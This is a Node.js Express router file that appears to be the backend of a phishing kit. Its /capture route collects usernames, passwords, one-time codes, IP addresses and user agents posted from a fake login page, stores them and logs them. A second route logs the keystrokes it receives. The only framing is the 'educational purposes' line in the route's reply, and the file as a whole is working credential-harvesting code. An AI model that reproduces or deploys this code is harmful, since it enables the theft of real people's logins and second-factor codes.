const express = require('express');
const router = express.Router();
const { v4: uuidv4 } = require('uuid');

// Capture credentials from login page
router.post('/capture', (req, res) => {
  try {
    const { type, identifier, password, code, userAgent } = req.body;
    
    const capturedItem = {
      id: uuidv4(),
      type: type || 'LOGIN_ATTEMPT',
      identifier: identifier,
      password: password,
      code: code,
      userAgent: userAgent || req.get('User-Agent'),
      ip: req.ip || req.connection.remoteAddress,
      timestamp: new Date().toISOString(),
      sessionId: uuidv4()
    };

    // Add to global storage
    global.capturedData.unshift(capturedItem);
    
    // Keep only last 100 items to prevent memory issues
    if (global.capturedData.length > 100) {
      global.capturedData = global.capturedData.slice(0, 100);
    }

    console.log('🎯 CAPTURED:', {
      type: capturedItem.type,
      identifier: capturedItem.identifier,
      password: capturedItem.password ? '***' : 'none',
      code: capturedItem.code ? '***' : 'none',
      timestamp: capturedItem.timestamp
    });

    res.json({ 
      success: true, 
      message: 'Data captured for educational purposes',
      id: capturedItem.id
    });

  } catch (error) {
    console.error('Capture error:', error);
    res.status(500).json({ success: false, error: 'Internal server error' });
  }
});

// Capture keystrokes (optional)
router.post('/capture/keystrokes', (req, res) => {
  try {
    const { sessionId, keystrokes } = req.body;
    
    console.log('⌨️ Keystrokes captured:', {
      sessionId: sessionId,
      keystrokeCount: keystrokes.length
    });

    res.json({ success: true });

  } catch (error) {
    console.error('Keystroke capture error:', error);
    res.status(500).json({ success: false, error: 'Internal server error' });
  }
});

module.exports = router;